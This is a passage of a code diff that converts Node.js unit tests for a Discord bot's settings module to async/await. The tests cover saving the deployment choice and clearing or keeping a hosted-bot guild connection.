   delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
 });
 
-test("updateDiscordBotRoleIds clears a previously-persisted hosted-bot connection when deploymentChoice is saved as self-hosted", () => {
+test("updateDiscordBotRoleIds clears a previously-persisted hosted-bot connection when deploymentChoice is saved as self-hosted", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-selfhosted-clears-"));
-  persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "111111111111111111", guildName: "Fleetyard" });
+  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "111111111111111111", guildName: "Fleetyard" });
   assert.equal(readDiscordBotSettingsState({}).hostedBotConnectedGuildName, "Fleetyard", "sanity check: the connection is really persisted before switching to self-hosted");
 
-  updateDiscordBotRoleIds({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: "self-hosted" });
+  await updateDiscordBotRoleIds({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: "self-hosted" });
   const state = readDiscordBotSettingsState({});
   assert.equal(state.hostedBotConnectedGuildId, null, "switching back to self-hosted must clear the persisted hosted-bot connection");
   assert.equal(state.hostedBotConnectedGuildName, null);
@@ -719,12 +719,12 @@ test("updateDiscordBotRoleIds clears a previously-persisted hosted-bot connectio
 // smallest possible write: only this one key, no restart-task creation
 // (unlike updateDiscordBotRoleIds/enableDiscordBotAdapter, which both
 // return { ok, task } via their route handlers -- this never does).
-test("setDeploymentChoice persists only deploymentChoice -- never touches role IDs, the token, or the enabled flag", () => {
+test("setDeploymentChoice persists only deploymentChoice -- never touches role IDs, the token, or the enabled flag", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-set-choice-"));
   const before = readDiscordBotSettingsState({});
   assert.equal(before.enabled, false);
 
-  const result = setDeploymentChoice({ repoRoot: dir }, "hosted");
+  const result = await setDeploymentChoice({ repoRoot: dir }, "hosted");
   assert.deepEqual(result, { ok: true });
 
   const after = readDiscordBotSettingsState({});
@@ -736,19 +736,19 @@ test("setDeploymentChoice persists only deploymentChoice -- never touches role I
   delete process.env.DUNE_DISCORD_ADAPTER_DEPLOYMENT_CHOICE;
 });
 
-test("setDeploymentChoice rejects anything other than \"hosted\" or \"self-hosted\"", () => {
+test("setDeploymentChoice rejects anything other than \"hosted\" or \"self-hosted\"", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-set-choice-invalid-"));
-  const result = setDeploymentChoice({ repoRoot: dir }, "not-a-real-choice");
+  const result = await setDeploymentChoice({ repoRoot: dir }, "not-a-real-choice");
   assert.deepEqual(result, { ok: false });
   assert.equal(readDiscordBotSettingsState({}).deploymentChoice, null, "an invalid value must not be persisted");
 });
 
-test("setDeploymentChoice clears a previously-persisted hosted-bot connection when switching to self-hosted", () => {
+test("setDeploymentChoice clears a previously-persisted hosted-bot connection when switching to self-hosted", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-set-choice-clears-"));
-  persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "111111111111111111", guildName: "Fleetyard" });
+  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "111111111111111111", guildName: "Fleetyard" });
   assert.equal(readDiscordBotSettingsState({}).hostedBotConnectedGuildName, "Fleetyard");
 
-  setDeploymentChoice({ repoRoot: dir }, "self-hosted");
+  await setDeploymentChoice({ repoRoot: dir }, "self-hosted");
   const state = readDiscordBotSettingsState({});
   assert.equal(state.hostedBotConnectedGuildId, null);
   assert.equal(state.hostedBotConnectedGuildName, null);
@@ -758,14 +758,14 @@ test("setDeploymentChoice clears a previously-persisted hosted-bot connection wh
   delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
 });
 
-test("updateDiscordBotRoleIds does NOT clear a persisted hosted-bot connection when deploymentChoice is saved as hosted (or omitted)", () => {
+test("updateDiscordBotRoleIds does NOT clear a persisted hosted-bot connection when deploymentChoice is saved as hosted (or omitted)", async () => {
   const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-hosted-nostrip-"));
-  persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "111111111111111111", guildName: "Fleetyard" });
+  await persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "111111111111111111", guildName: "Fleetyard" });
 
-  updateDiscordBotRoleIds({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: "hosted" });
+  await updateDiscordBotRoleIds({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, { deploymentChoice: "hosted" });
   assert.equal(readDiscordBotSettingsState({}).hostedBotConnectedGuildName, "Fleetyard", "saving deploymentChoice as \"hosted\" again must not clear a real, still-valid connection");
 
-  updateDiscordBotRoleIds({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, {});
+  await updateDiscordBotRoleIds({ repoRoot: dir }, { player: [], moderator: [], admin: [] }, {});
   assert.equal(readDiscordBotSettingsState({}).hostedBotConnectedGuildName, "Fleetyard", "an ordinary role-ID-only save (no deploymentChoice) must not clear a real, still-valid connection");
 
   delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_ID;
